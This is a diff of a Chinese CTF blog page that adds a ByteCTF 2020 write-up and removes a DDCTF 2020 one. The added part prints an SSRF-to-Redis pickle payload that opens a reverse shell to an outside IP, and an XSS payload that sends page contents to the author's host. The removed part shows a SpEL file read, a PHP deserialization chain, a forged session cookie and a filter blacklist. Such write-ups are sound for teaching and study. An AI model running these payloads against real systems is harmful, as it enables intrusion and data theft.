@@ -66,6 +66,199 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-2020ByteCTF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/10/26/2020ByteCTF/" class="article-date">
+  <time class="dt-published" datetime="2020-10-26T13:28:23.439Z" itemprop="datePublished">2020-10-26</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/10/26/2020ByteCTF/">2020ByteCTF</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="ByteCTF2020"><a href="#ByteCTF2020" class="headerlink" title="ByteCTF2020"></a>ByteCTF2020</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="easy-scrapy"><a href="#easy-scrapy" class="headerlink" title="easy_scrapy"></a>easy_scrapy</h3><p>体验一编网站的功能后，发现如下api</p>
+<pre><code>/list
+/push post:url=https%3A%2F%2Fwww.4399.com&amp;code=16674458
+/result?url=https://www.4399.com</code></pre><p>让网站爬取自己的服务器以获得请求头</p>
+<pre><code>GET / HTTP/1.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en
+User-Agent: scrapy_redis
+Accept-Encoding: gzip, deflate
+Host: ccreater.top:60000
+
+</code></pre><p>通过ua头发现是：scrapy_redis</p>
+<p>本地搭建scrapy_redis服务爬取网站，查看redis里设置的键值，发现myscrapy:requests中</p>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201026113031.png" alt="image528"></p>
+<p>存在的pickle数据</p>
+<p>网站自然提交http和https协议的url，但是因为是爬虫猜测嵌入一个a标签就可以绕过这个限制</p>
+<p>提交如下网站</p>
+<pre><code>&lt;a href=&quot;file:///etc/passwd&quot;&gt;</code></pre><p>成功读取到/etc/passwd，把爬虫代码爬下来本地测试</p>
+<p>scrapy.cfg</p>
+<pre><code class="python"># Automatically created by: scrapy startproject
+#
+# For more information about the [deploy] section see:
+# https://scrapyd.readthedocs.io/en/latest/deploy.html
+
+[settings]
+default = bytectf.settings
+
+[deploy]
+#url = http://localhost:6800/
+project = bytectf</code></pre>
+<p>bytectf/settings.py</p>
+<pre><code class="python">BOT_NAME = &#39;bytectf&#39;
+SPIDER_MODULES = [&#39;bytectf.spiders&#39;]
+NEWSPIDER_MODULE = &#39;bytectf.spiders&#39;
+RETRY_ENABLED = False
+ROBOTSTXT_OBEY = False
+DOWNLOAD_TIMEOUT = 8
+USER_AGENT = &#39;scrapy_redis&#39;
+SCHEDULER = &quot;scrapy_redis.scheduler.Scheduler&quot;
+DUPEFILTER_CLASS = &quot;scrapy_redis.dupefilter.RFPDupeFilter&quot;
+REDIS_HOST = &#39;172.20.0.7&#39;
+REDIS_PORT = 6379
+ITEM_PIPELINES = {
+   &#39;bytectf.pipelines.BytectfPipeline&#39;: 300,
+}</code></pre>
+<p>bytectf/byte.py</p>
+<pre><code class="python">import scrapy
+import re
+import base64
+from scrapy_redis.spiders import RedisSpider
+from bytectf.items import BytectfItem
+
+class ByteSpider(RedisSpider):
+    name = &#39;byte&#39;
+
+    def parse(self, response):
+        byte_item = BytectfItem()
+        byte_item[&#39;byte_start&#39;] = response.request.url#ä¸»é®ï¼åå§url
+        url_list = []
+        test = response.xpath(&#39;//a/@href&#39;).getall()
+        for i in test:
+            if i[0] == &#39;/&#39;:
+                url = response.request.url + i
+            else:
+                url = i
+            if re.search(r&#39;://&#39;,url):
+                r = scrapy.Request(url,callback=self.parse2,dont_filter=True)
+                r.meta[&#39;item&#39;] = byte_item
+                yield r
+                url_list.append(url)
+                if(len(url_list)&gt;3):
+                    break
+        byte_item[&#39;byte_url&#39;] = response.request.url
+        byte_item[&#39;byte_text&#39;] = base64.b64encode((response.text).encode(&#39;utf-8&#39;))
+        yield byte_item
+
+    def parse2(self,response):
+        item = response.meta[&#39;item&#39;]
+        item[&#39;byte_url&#39;] = response.request.url
+        item[&#39;byte_text&#39;] = base64.b64encode((response.text).encode(&#39;utf-8&#39;))
+        yield item</code></pre>
+<p>bytectf/items.py</p>
+<pre><code class="python">import scrapy
+
+
+class BytectfItem(scrapy.Item):
+    # define the fields for your item here like:
+    # name = scrapy.Field()
+    byte_start = scrapy.Field()#
+    byte_text = scrapy.Field()#text</code></pre>
+<p>bytectf/pipelines.py</p>
+<pre><code class="python">import pymongo
+
+class BytectfPipeline:
+    def __init__:
+        MONGODB_HOST = &#39;172.20.0.8&#39;
+        MONGODB_PORT = 27017
+        MONGODB_DBNAME = &#39;result&#39;
+        MONGODB_TABLE = &#39;result&#39;
+        MONGODB_USER = &#39;N0rth3&#39;
+        MONGODB_PASSWD = &#39;E7B70D0456DAD39E22735E0AC64A69AD&#39;
+        mongo_client = pymongo.MongoClient(&quot;%s:%d&quot; % (MONGODB_HOST, MONGODB_PORT))
+        mongo_client[MONGODB_DBNAME].authenticate(MONGODB_USER, MONGODB_PASSWD, MONGODB_DBNAME)
+        mongo_db = mongo_client[MONGODB_DBNAME]
+        self.table = mongo_db[MONGODB_TABLE]
+
+
+
+    def process_item(self, item, spider):
+        quote_info = dict(item)
+        print(quote_info)
+        self.table.insert(quote_info)
+        return item</code></pre>
+<p>测试<code>&lt;a href=&quot;gopher://.....&quot;&gt;</code>发现并不能解析gopher协议</p>
+<p>继续测试发现接口<code>/result?url=https://www.4399.com</code>，也存在ssrf漏洞且至此gopher协议</p>
+<p>传入以下payload:</p>
+<pre><code>gopher%3a//172.20.0.7%3a6379/_%250D%250Azadd%2520byte%253Arequests%25201%2520%2522cos%255Cnsystem%255Cn%2528S%2527python%2520-c%2520%255Cx27import%2520socket%252Csubprocess%252Cos%253Bs%253Dsocket.socket%2528socket.AF_INET%252Csocket.SOCK_STREAM%2529%253Bs.connect%2528%2528%255Cx2239.108.164.219%255Cx22%252C60003%2529%2529%253Bos.dup2%2528s.fileno%2528%2529%252C0%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C1%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C2%2529%253Bp%253Dsubprocess.call%2528%255B%255Cx22/bin/sh%255Cx22%252C%255Cx22-i%255Cx22%255D%2529%253B%255Cx27%2527%255CntR.%2522%250D%250Aquit%250D%250A</code></pre><p>成功弹回shell</p>
+<h3 id="douyin-vedio"><a href="#douyin-vedio" class="headerlink" title="douyin_vedio"></a>douyin_vedio</h3><p>题目描述</p>
+<blockquote>
+<p>Do you like douyin video?<br>Submit your payload at <a href="http://c.bytectf.live:30002/" target="_blank" rel="noopener">http://c.bytectf.live:30002/</a></p>
+<p>( Server URLs which only admin can access:<br><a href="http://a.bytectf.live:30001/" target="_blank" rel="noopener">http://a.bytectf.live:30001/</a><br><a href="http://b.bytectf.live:30001/" target="_blank" rel="noopener">http://b.bytectf.live:30001/</a> )</p>
+</blockquote>
+<p>题目中只能将<a href="http://a.bytectf.live:30001/" target="_blank" rel="noopener">http://a.bytectf.live:30001/</a> 开头的url发给管理员，而c.bytectf.live中存在未过滤的xss点</p>
+<p>思路就很清晰了，想办法跳转到c.bytectf.live再说，我们查看源代码发现：</p>
+<pre><code>RewriteRule /favicon.ico$ /favicon.ico [QSA,PT,L]
+RewriteRule /$ / [QSA,PT,L]
+RewriteRule /search$ /search [QSA,PT,L]
+RewriteRule /send$ /send [QSA,PT,L]
+RewriteRule /static/(.*)$ /static/$1 [QSA,PT,L]
+RewriteRule (.*)$ http://www.douyin.com$1  </code></pre><p>最后一个神奇的重写规则，所以我们只要在<a href="http://www.douyin.com下找到一个任意url跳转就可以执行c.bytectf.live的xss" target="_blank" rel="noopener">www.douyin.com下找到一个任意url跳转就可以执行c.bytectf.live的xss</a></p>
+<p>通常url跳转常出现在登入登出，还有外站url跳转，顺着这个思路我们可以找到<code>http://www.douyin.com/logout/?next=https%3A%2F%2Fwww.douyin.com/23333</code>可以跳转到部分域名(<a href="http://www.douyin.com" target="_blank" rel="noopener">www.douyin.com</a> , creator.douyin.com …)</p>
+<p>这样就扩大了我们的攻击面，继续按照相同的思路进一步扩大攻击面的url:<code>https://creator.douyin.com/passport/web/logout/?next=https://www.douyin.com</code></p>
+<p>测试发现可以跳转到任意<code>douyin.com/bytedance.com/.bytecdn.cn/ixigua.com/bytedance.net/snssdk.com/toutiao.com/huoshan.com/jinritemai.com</code>结尾的域名</p>
+<p>接着用谷歌搜索：<code>site:xxxxxxx.com 跳转</code> 发现任意url跳转:<code>https://tsearch-quic.snssdk.com/search/jump?url=http://ccreater.top:60080</code></p>
+<p>组合成跳转到c.bytectf.live的url:</p>
+<pre><code>http://a.bytectf.live:30001/logout?next=https%3a//creator.douyin.com/passport/web/logout/%3fnext%3dhttps://tsearch-quic.snssdk.com/search/jump?url=http://c.bytectf.live:30002/?action=post%25252526id=b44cb32f302e2d4249dea06a2ffa0da1</code></pre><p>因为安全策略的设置问题(<code>frame-ancestors http://*.bytectf.live:*/</code>覆盖了<code>[&#39;X-Frame-Options&#39;] = &#39;sameorigin&#39;</code>)，导致我们可以直接作为iframe导入，读取内容</p>
+<pre><code>    resp.headers[&#39;X-Frame-Options&#39;] = &#39;sameorigin&#39;
+    resp.headers[&#39;Content-Security-Policy&#39;] = &quot;default-src http://*.bytectf.live:*/ &#39;unsafe-inline&#39;; frame-src *; frame-ancestors http://*.bytectf.live:*/&quot;
+    resp.headers[&#39;X-Content-Type-Options&#39;] = &#39;nosniff&#39;
+    resp.headers[&#39;Referrer-Policy&#39;] = &#39;same-origin&#39;</code></pre><p>所以xss的代码是：</p>
+<pre><code class="javascript">document.domain=&quot;bytectf.live&quot;; 
+flagPage=document.createElement(&quot;iframe&quot;); flagPage.src=&quot;http://a.bytectf.live:30001/?keyword=B&quot;; document.body.append(flagPage); setTimeout(()=&gt;{ document.location=&quot;http://ccreater.top:60001/&quot;+btoa(document.body.getElementsByTagName(&quot;iframe&quot;)[0].contentWindow.document.body.innerHTML) },500)
+</code></pre>
+<p>但是不知道为啥iframe.src=<code>http://a.bytectf.live:30001/</code>可以获取到内容，而<code>http://a.bytectf.live:30001/send</code>却不可以。。。</p>
+<p>监听端口成功拿到flag</p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/10/26/2020ByteCTF/">http://blog.ccreater.top/2020/10/26/2020ByteCTF/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.ccreater.top/2020/10/26/2020ByteCTF/" data-id="ckgqkumyy00007ovd50yzchww" data-title="2020ByteCTF" class="article-share-link">Share</a>
+      
+	  
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+
+  
     <article id="post-巅峰极客2020wp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2020/10/20/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020wp/" class="article-date">
@@ -2622,494 +2815,6 @@ public class test {
 
 
   
-    <article id="post-DDCTF2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/09/07/DDCTF2020/" class="article-date">
-  <time class="dt-published" datetime="2020-09-07T12:44:26.069Z" itemprop="datePublished">2020-09-07</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/09/07/DDCTF2020/">DDCTF2020</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="DDCTF2020"><a href="#DDCTF2020" class="headerlink" title="DDCTF2020"></a>DDCTF2020</h1><h2 id="拼图游戏"><a href="#拼图游戏" class="headerlink" title="拼图游戏"></a>拼图游戏</h2><p>纯手工</p>
-<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200906061331.png" alt="image80"></p>
-<h2 id="Web签到题"><a href="#Web签到题" class="headerlink" title="Web签到题"></a>Web签到题</h2><p>根据题目提示得到两个接口</p>
-<pre><code>Method | POST
-URL    | http://117.51.136.197/admin/login
-Param  | username str | pwd str
-Response
-token str | auth(Certification information)
-
-- auth interface
-Request
-Method | POST
-URL    | http://117.51.136.197/admin/auth
-Param  | username str | pwd str | token str
-Response</code></pre><p>用c-jwt-cracker爆破login生成的jwt</p>
-<p>得到下一步入口：</p>
-<pre><code>client dowload url: http://117.51.136.197/B5Itb8dFDaSFWZZo/client</code></pre><p>是一个go文件，叫二进制队友来逆</p>
-<p>得到收发脚本：</p>
-<pre><code class="python">import hmac
-import base64
-import time
-import requests
-t = time.time()
-print(t)
-t = str(t)
-
-t = t[:10]
-cmd=&quot;99-9&quot;
-s = &quot;{}|&quot;.format(cmd) + t
-print(s)
-t = bytes(s, encoding = &quot;utf8&quot;)
-message = t
-key = b&#39;DDCTFWithYou&#39;
-h = hmac.new(key,message,digestmod=&#39;SHA256&#39;)
-signature=base64.b64encode(h.digest()).decode()
-
-
-burp0_url = &quot;http://117.51.136.197:80/server/command&quot;
-burp0_headers = {&quot;User-Agent&quot;: &quot;Go-http-client/1.1&quot;, &quot;Content-Type&quot;: &quot;application/json&quot;, &quot;Accept-Encoding&quot;: &quot;gzip&quot;}
-burp0_json={&quot;signature&quot;:signature ,&quot;command&quot;: cmd,  &quot;timestamp&quot;: s[-10:]}
-print(burp0_json)
-r=requests.post(burp0_url, headers=burp0_headers, json=burp0_json,proxies={&quot;http&quot;:&quot;&quot;})
-print(r.text)</code></pre>
-<p>但是在这里我卡住了，因为client是用go写的我也理所当然的认为后端也是用</p>
-<p>go写的，于是就去试go的各种eval框架都不行，最后还是在别人的提示下才走出误区（应该写一个测试SSTI，eval等等的fuzz字典），经过一天的折腾后发现是SPeL</p>
-<p>去网上找到了Ying师傅的payload</p>
-<p><code>NEW java.util.Scanner(NEW java.io.BufferedReader(NEW java.io.FileReader(NEW java.io.File(&#39;/home/dc2-user/flag/flag.txt&#39;)))).nextLine()</code></p>
-<p><code>DDCTF{Q24uf486whGOWN44UtZCjYUgdnnnRaVs}</code></p>
-<h2 id="卡片商店"><a href="#卡片商店" class="headerlink" title="卡片商店"></a>卡片商店</h2><p>目标是让我们拿到100个卡片，但是有时间限制，利用借入和借出来获得100个卡片显然是不现实的。</p>
-<p>刚开始想的是条件竞争，后来测试后发现不行，在这里我被卡住了。</p>
-<p>继续测试发现，这里存在着整数溢出漏洞（卡片数是个大整数，而借入借出是个小整数），我们让卡片数不溢出，而借入数溢出，就可以得到许多卡片。接着我们得到了一个SecKey和获取flag的地址：<code>/flag</code>，但是需要我们是admin账号</p>
-<p><code>session:MTU5OTIyNTI5MXxEdi1CQkFFQ180SUFBUkFCRUFBQV80dl9nZ0FDQm5OMGNtbHVad3dJQUFaM1lXeHNaWFFHYzNSeWFXNW5ERlFBVW5zaWIzZHBibWR6SWpwYlhTd2lhVzUyWlhOMGN5STZXMTBzSW0xdmJtVjVJam93TENKdWIzZGZkR2x0WlNJNk1UVTVPVEl5TlRJNU1Td2ljM1JoY25SZmRHbHRaU0k2TVRVNU9USXlOVEk1TVgwR2MzUnlhVzVuREFjQUJXRmtiV2x1QkdKdmIyd0NBZ0FBfMaqAqFFw43-8z8EcAFY04oenUI0FyhjaW8KZXGH2uSX</code></p>
-<p>对session进行解密发现,他的格式类似：<code>base64encode(timestamp|base64urlencode(gob)|check)</code></p>
-<p>利用<a href="https://gitlab.com/drosseau/degob" target="_blank" rel="noopener">https://gitlab.com/drosseau/degob</a> 获得gob内容</p>
-<p><code>map[interface{}]interface{}{&quot;admin&quot;: false,&quot;wallet&quot;: &quot;{&quot;owings&quot;:[{&quot;OwingMoney&quot;:100000,&quot;NeedMoney&quot;:100002,&quot;OwingTime&quot;:1599223614}],&quot;invests&quot;:[{&quot;InvestMoney&quot;:100006,&quot;ReceiveMoney&quot;:100009,&quot;InvestTime&quot;:1599223644}],&quot;money&quot;:0,&quot;now_time&quot;:1599222955,&quot;start_time&quot;:1599222835}&quot;}</code></p>
-<p>显然我们需要修改admin的值，在云屿师傅的帮助下知道了这是一个gin生成的session</p>
-<pre><code class="go">package main
-
-import (
-        &quot;github.com/gin-contrib/sessions&quot;
-        &quot;github.com/gin-contrib/sessions/cookie&quot;
-        &quot;github.com/gin-gonic/gin&quot;
-)
-
-func main() {
-        r := gin.Default()
-        store := cookie.NewStore([]byte(&quot;Udc13VD5adM_c10nPxFu@v12&quot;))
-        r.Use(sessions.Sessions(&quot;session&quot;, store))
-
-        r.GET(&quot;/incr&quot;, func(c *gin.Context) {
-                session := sessions.Default(c)
-                var count bool
-                v := session.Get(&quot;admin&quot;)
-                if v == nil {
-                        count = true
-                } else {
-                        count = v.(bool)
-                        count = true
-                }
-                session.Set(&quot;admin&quot;, count)
-                session.Save()
-                c.JSON(200, gin.H{&quot;admin&quot;: count})
-        })
-        r.Run(&quot;:8000&quot;)
-}</code></pre>
-<p>得到flag:<code>DDCTF{Th151s3AsY4ormE2333!}</code></p>
-<h2 id="Overwrite-Me"><a href="#Overwrite-Me" class="headerlink" title="Overwrite Me"></a>Overwrite Me</h2><p>题目环境：PHP/5.6.10</p>
-<p>题目源码：</p>
-<pre><code class="php">Welcome to DDCTF 2020, Have fun!
-
-&lt;?php
-error_reporting(0);
-
-class MyClass
-{
-    var $kw0ng;
-    var $flag;
-
-    public function __wakeup()
-    {
-        $this-&gt;kw0ng = 2;
-    }
-
-    public function get_flag()
-    {
-        return system(&#39;find /HackersForever &#39; . escapeshellcmd($this-&gt;flag));
-    }
-}
-
-class HintClass
-{   
-    protected  $hint;
-    public function execute($value)
-    {
-        include($value);
-    }
-
-    public function __invoke()
-    {
-        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|zlib|zip|bzip2|data|glob|phar|ssh2|rar|ogg|expect|\.\.|\.\//i&quot;, $this-&gt;hint))
-        {
-            die(&quot;Don&#39;t Do That!&quot;);
-        }
-        $this-&gt;execute($this-&gt;hint);
-    }
-}
-
-class ShowOff
-{
-    public $contents;
-    public $page;
-    public function __construct($file=&#39;/hint/hint.php&#39;)
-    {
-        $this-&gt;contents = $file;
-        echo &quot;Welcome to DDCTF 2020, Have fun!&lt;br/&gt;&lt;br/&gt;&quot;;
-    }
-    public function __toString()
-    {
-        return $this-&gt;contents();
-    }
-
-    public function __wakeup()
-    {
-        $this-&gt;page-&gt;contents = &quot;POP me! I can give you some hints!&quot;;
-        unset($this-&gt;page-&gt;cont);
-    }
-}
-
-class MiddleMan
-{
-    private $cont;
-    public $content;
-    public function __construct()
-    {
-        $this-&gt;content = array();
-    }
-
-    public function __unset($key)
-    {
-        $func = $this-&gt;content;
-        return $func();
-    }
-}
-
-class Info
-{
-    function __construct()
-    {
-        eval(&#39;phpinfo();&#39;);
-    }
-
-}
-
-$show = new ShowOff();
-$bullet = $_GET[&#39;bullet&#39;];
-
-if(!isset($bullet))
-{
-    highlight_file(__FILE__);
-    die(&quot;Give Me Something!&quot;);
-}else if($bullet == &#39;phpinfo&#39;)
-{
-    $infos = new Info();
-}else
-{
-    $obstacle1 = new stdClass;
-    $obstacle2 = new stdClass;
-    $mc = new MyClass();
-    $mc-&gt;flag = &quot;MyClass&#39;s flag said, Overwrite Me If You Can!&quot;;
-    @unserialize($bullet);
-    echo $mc-&gt;get_flag();
-}</code></pre>
-<p>直接访问hint.php</p>
-<p>得到：<code>Good Job! You&#39;ve got the preffix of the flag: DDCTF{VgQN6HXC2moDAq39And i&#39;ll give a hint, I have already installed the PHP GMP extension, It has a kind of magic in php unserialize, Can you utilize it to get the remaining flag? Go ahead!</code></p>
-<p>看样子是要让我们利用GMP打他</p>
-<p>这里不急先分析一下代码，构思一下可以利用的反序列化链</p>
-<p><code>ShowOff::__wakeup-&gt;MiddleMan::__unset-&gt;$func();</code> </p>
-<p>令<code>$func=[MyClass,&quot;get_flag&quot;]</code>实现任意命令执行，结束（GMP就不见了，盲猜出题人没限制好）</p>
-<h2 id="Easy-Web"><a href="#Easy-Web" class="headerlink" title="Easy Web"></a>Easy Web</h2><p>第一次熬夜杠题，真爽</p>
-<p>登陆失败后响应体出现：<code>RememberMe=DeleteMe</code>，shiro稳了</p>
-<p>尝试一下Shiro 反序列化，果然GG</p>
-<p><a href="https://shiro.apache.org/security-reports.html" target="_blank" rel="noopener">https://shiro.apache.org/security-reports.html</a></p>
-<p>去官网看下CVE，试一下发现存在CVE-2020-11989</p>
-<p><a href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/index" target="_blank" rel="noopener">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/index</a></p>
-<p>绕过权限验证，发现任意文件读取接口</p>
-<p><code>http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=static/hello.jpg</code></p>
-<p>（原本是想直接读取Shiro的key来直接打穿的，搞了好久都没找到）</p>
-<p>常规思路：</p>
-<ol>
-<li><p>先读取 web.xml</p>
-<pre><code class="xml">&lt;web-app xmlns=&quot;http://java.sun.com/xml/ns/javaee&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
-xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;
-version=&quot;3.0&quot; metadata-complete=&quot;false&quot;&gt;
-  &lt;display-name&gt;Archetype Created Web Application&lt;/display-name&gt;
-  &lt;context-param&gt;
-    &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;
-    &lt;param-value&gt;classpath:spring-core.xml&lt;/param-value&gt;
-  &lt;/context-param&gt;
-  &lt;listener&gt;
-    &lt;listener-class&gt;org.springframework.web.util.WebAppRootListener&lt;/listener-class&gt;
-  &lt;/listener&gt;
-  &lt;listener&gt;
-    &lt;listener-class&gt;org.springframework.web.util.IntrospectorCleanupListener&lt;/listener-class&gt;
-  &lt;/listener&gt;
-  &lt;listener&gt;
-    &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt;
-  &lt;/listener&gt;
-  &lt;servlet&gt;
-    &lt;servlet-name&gt;springmvc&lt;/servlet-name&gt;
-    &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;
-    &lt;init-param&gt;
-      &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;
-      &lt;param-value&gt;classpath:spring-web.xml&lt;/param-value&gt;
-    &lt;/init-param&gt;
-  &lt;/servlet&gt;
-  &lt;servlet-mapping&gt;
-    &lt;servlet-name&gt;springmvc&lt;/servlet-name&gt;
-    &lt;url-pattern&gt;/&lt;/url-pattern&gt;
-  &lt;/servlet-mapping&gt;
-  &lt;filter&gt;
-    &lt;filter-name&gt;encodingFilter&lt;/filter-name&gt;
-    &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt;
-    &lt;init-param&gt;
-      &lt;param-name&gt;encoding&lt;/param-name&gt;
-      &lt;param-value&gt;UTF-8&lt;/param-value&gt;
-    &lt;/init-param&gt;
-    &lt;init-param&gt;
-      &lt;param-name&gt;forceEncoding&lt;/param-name&gt;
-      &lt;param-value&gt;true&lt;/param-value&gt;
-    &lt;/init-param&gt;
-  &lt;/filter&gt;
-  &lt;filter-mapping&gt;
-    &lt;filter-name&gt;encodingFilter&lt;/filter-name&gt;
-    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
-  &lt;/filter-mapping&gt;
-  &lt;filter&gt;
-    &lt;filter-name&gt;safeFilter&lt;/filter-name&gt;
-    &lt;filter-class&gt;com.ctf.util.SafeFilter&lt;/filter-class&gt;
-  &lt;/filter&gt;
-  &lt;filter-mapping&gt;
-    &lt;filter-name&gt;safeFilter&lt;/filter-name&gt;
-    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
-  &lt;/filter-mapping&gt;
-  &lt;filter&gt;
-    &lt;filter-name&gt;shiroFilter&lt;/filter-name&gt;
-    &lt;filter-class&gt;org.springframework.web.filter.DelegatingFilterProxy&lt;/filter-class&gt;
-    &lt;init-param&gt;
-      &lt;param-name&gt;targetFilterLifecycle&lt;/param-name&gt;
-      &lt;param-value&gt;true&lt;/param-value&gt;
-    &lt;/init-param&gt;
-  &lt;/filter&gt;
-  &lt;filter-mapping&gt;
-    &lt;filter-name&gt;shiroFilter&lt;/filter-name&gt;
-    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
-  &lt;/filter-mapping&gt;
-  &lt;error-page&gt;
-    &lt;error-code&gt;500&lt;/error-code&gt;
-    &lt;location&gt;/error.jsp&lt;/location&gt;
-  &lt;/error-page&gt;
-  &lt;error-page&gt;
-    &lt;error-code&gt;404&lt;/error-code&gt;
-    &lt;location&gt;/hacker.jsp&lt;/location&gt;
-  &lt;/error-page&gt;
-  &lt;error-page&gt;
-    &lt;error-code&gt;403&lt;/error-code&gt;
-    &lt;location&gt;/hacker.jsp&lt;/location&gt;
-  &lt;/error-page&gt;
-&lt;/web-app&gt;</code></pre>
-</li>
-<li><p>依次读取class文件：<br><a href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/util/SafeFilter.class" target="_blank" rel="noopener">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/util/SafeFilter.class</a></p>
-<pre><code class="java">package com.ctf.util;
-
-import java.io.IOException;
-import java.util.Enumeration;
-import java.util.regex.Matcher;
-import java.util.regex.Pattern;
-import javax.servlet.Filter;
-import javax.servlet.FilterChain;
-import javax.servlet.FilterConfig;
-import javax.servlet.ServletException;
-import javax.servlet.ServletRequest;
-import javax.servlet.ServletResponse;
-import javax.servlet.http.HttpServletResponse;
-
-public class SafeFilter
-  implements Filter
-{
-  private final String encoding = &quot;UTF-8&quot;;
-  private static String[] blacklists = { &quot;java.+lang&quot;, &quot;Runtime|Process|byte|OutputStream|session|\&quot;|&#39;&quot;, &quot;exec.*\\(&quot;, &quot;write|read&quot;, &quot;invoke.*\\(&quot;, &quot;\\.forName.*\\(&quot;, &quot;lookup.*\\(&quot;, &quot;\\.getMethod.*\\(&quot;, &quot;javax.+script.+ScriptEngineManager&quot;, &quot;com.+fasterxml&quot;, &quot;org.+apache&quot;, &quot;org.+hibernate&quot;, &quot;org.+thymeleaf&quot;, &quot;javassist&quot;, &quot;javax\\.&quot;, &quot;eval.*\\(&quot;, &quot;\\.getClass\\(&quot;, &quot;org.+springframework&quot;, &quot;javax.+el&quot;, &quot;java.+io&quot; };
-
-  public void init(FilterConfig arg0)
-    throws ServletException
-  {}
-
-  public void doFilter(ServletRequest request, ServletResponse response, FilterChain filterChain)
-    throws IOException, ServletException
-  {
-    request.setCharacterEncoding(&quot;UTF-8&quot;);
-    response.setCharacterEncoding(&quot;UTF-8&quot;);
-    Enumeration pNames = request.getParameterNames();
-    while (pNames.hasMoreElements())
-    {
-      String name = (String)pNames.nextElement();
-      String value = request.getParameter(name);
-      for (String blacklist : blacklists)
-      {
-        Matcher matcher = Pattern.compile(blacklist, 34).matcher(value);
-        if (matcher.find())
-        {
-          HttpServletResponse servletResponse = (HttpServletResponse)response;
-          servletResponse.sendError(403);
-        }
-      }
-    }
-    filterChain.doFilter(request, response);
-  }
-
-  public void destroy() {}
-}
-</code></pre>
-<p>然后其他的被waf过滤了<br>读取web.xml中的其他配置文件</p>
-<p><a href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/spring-core.xml" target="_blank" rel="noopener">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/spring-core.xml</a></p>
-<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
-&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;
-xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
-xmlns:p=&quot;http://www.springframework.org/schema/p&quot;
-xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot;
-xmlns:context=&quot;http://www.springframework.org/schema/context&quot;
-xmlns:jee=&quot;http://www.springframework.org/schema/jee&quot;
-xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot;
-xsi:schemaLocation=&quot;http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-4.0.xsd
-http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.0.xsd
-http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd
-http://www.springframework.org/schema/jee http://www.springframework.org/schema/jee/spring-jee-4.0.xsd
-http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-4.0.xsd&quot;&gt;
-  &lt;import resource=&quot;classpath:spring-shiro.xml&quot; /&gt;
